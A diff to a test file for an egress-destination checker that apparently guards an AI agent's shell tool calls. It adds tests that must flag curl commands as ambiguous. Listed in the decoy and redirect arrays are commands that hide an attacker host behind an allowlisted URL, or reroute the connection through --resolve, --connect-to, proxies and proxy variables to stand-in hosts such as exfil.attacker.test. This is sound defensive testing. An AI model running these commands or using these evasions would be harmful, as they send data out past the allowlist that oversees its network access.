@@ -262,6 +262,95 @@ describe("pulling an egress destination out of a shell command", () => {
     ).toEqual({ destination: "https://docs.anthropic.com.evil.test" });
   });
 
+  // One origin, however many times it is named, is a destination this module
+  // can vouch for.
+  it("answers the origin when every URL in the command names the same one", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl -e https://docs.anthropic.com/a https://docs.anthropic.com/b" }),
+      ),
+    ).toEqual({ destination: "https://docs.anthropic.com" });
+  });
+
+  it("answers the origin for a method flag, which is not a connection option", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl -X POST -d 'a=b' https://docs.anthropic.com/x" }),
+      ),
+    ).toEqual({ destination: "https://docs.anthropic.com" });
+  });
+
+  // THE DECOY CLASS (#470). The first URL in the command is allowlisted and is
+  // not where the request goes. Judging only the first match allowed every one
+  // of these against the shipped allowlist.
+  const DECOY_COMMANDS = [
+    "curl -H 'Referer: https://docs.anthropic.com/' https://exfil.attacker.test/steal",
+    "curl -e https://docs.anthropic.com/ https://exfil.attacker.test/steal",
+    "curl --referer https://docs.anthropic.com/ https://exfil.attacker.test/steal",
+    "curl -A 'https://docs.anthropic.com/' https://exfil.attacker.test/steal",
+    "curl -d 'src=https://docs.anthropic.com/' https://exfil.attacker.test/steal",
+    "curl https://docs.anthropic.com/ https://exfil.attacker.test/steal",
+    "curl https://exfil.attacker.test/steal -H 'Origin: https://docs.anthropic.com'",
+    "curl https://docs.anthropic.com:8443/ https://docs.anthropic.com/",
+  ];
+  for (const command of DECOY_COMMANDS) {
+    it(`refuses a command naming two origins: "${command}"`, () => {
+      expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: command }))).toEqual({
+        destination: AMBIGUOUS,
+      });
+    });
+  }
+
+  it("refuses when a later URL is ambiguous even though the first is plain", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com/ https://docs.anthropic.com@exfil.attacker.test/" }),
+      ),
+    ).toEqual({ destination: AMBIGUOUS });
+  });
+
+  // THE REDIRECT CLASS (#470). One URL, allowlisted, and an option or prefix
+  // that sends the connection somewhere else. curl's own `%{url.host}` still
+  // reports the allowlisted host for each of these, which is why they are not
+  // in the curl corpus: that corpus cannot tell a right answer from a wrong one
+  // here, and only the sentinel is right.
+  const REDIRECT_COMMANDS = [
+    "curl --resolve docs.anthropic.com:443:6.6.6.6 https://docs.anthropic.com/",
+    "curl --resolve=docs.anthropic.com:443:6.6.6.6 https://docs.anthropic.com/",
+    "curl --connect-to docs.anthropic.com:443:exfil.attacker.test:443 https://docs.anthropic.com/",
+    "curl -x 6.6.6.6:3128 https://docs.anthropic.com/",
+    "curl -sSx 6.6.6.6:3128 https://docs.anthropic.com/",
+    "curl -x6.6.6.6:3128 https://docs.anthropic.com/",
+    "curl --proxy 6.6.6.6:3128 https://docs.anthropic.com/",
+    "curl --proxy=6.6.6.6:3128 https://docs.anthropic.com/",
+    "curl --socks5-hostname 6.6.6.6:1080 https://docs.anthropic.com/",
+    "curl --preproxy socks5://6.6.6.6:1080 https://docs.anthropic.com/",
+    "curl --unix-socket /var/run/evil.sock https://docs.anthropic.com/",
+    "HTTPS_PROXY=http://6.6.6.6:3128 curl https://docs.anthropic.com/",
+    "https_proxy=6.6.6.6:3128 curl https://docs.anthropic.com/",
+    "export ALL_PROXY=6.6.6.6:3128; curl https://docs.anthropic.com/",
+    "env HTTP_PROXY=6.6.6.6:3128 curl https://docs.anthropic.com/",
+  ];
+  for (const command of REDIRECT_COMMANDS) {
+    it(`refuses a command that redirects the connection: "${command}"`, () => {
+      expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: command }))).toEqual({
+        destination: AMBIGUOUS,
+      });
+    });
+  }
+
+  it("stays silent about a redirect option when the command names no URL at all", () => {
+    expect(
+      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl --resolve a:443:1.2.3.4 localhost" })),
+    ).toEqual({});
+  });
+
   // The stated miss direction, asserted rather than left implicit: the stock
   // gate is `undefined` when no destination resolves, so the call falls
   // through to the other gates. A command this cannot parse is unexamined, not
@@ -375,7 +464,7 @@ const curlResolvedHosts = (await Bun.file(`${import.meta.dir}/fixtures/curl-reso
 
 describe("agreeing with curl about which host a command reaches, or refusing to answer", () => {
   it("has a corpus to check, so an emptied fixture cannot pass silently", () => {
-    expect(Object.keys(curlResolvedHosts).length).toBeGreaterThanOrEqual(18);
+    expect(Object.keys(curlResolvedHosts).length).toBeGreaterThanOrEqual(23);
   });
 
   for (const [command, curlHost] of Object.entries(curlResolvedHosts)) {
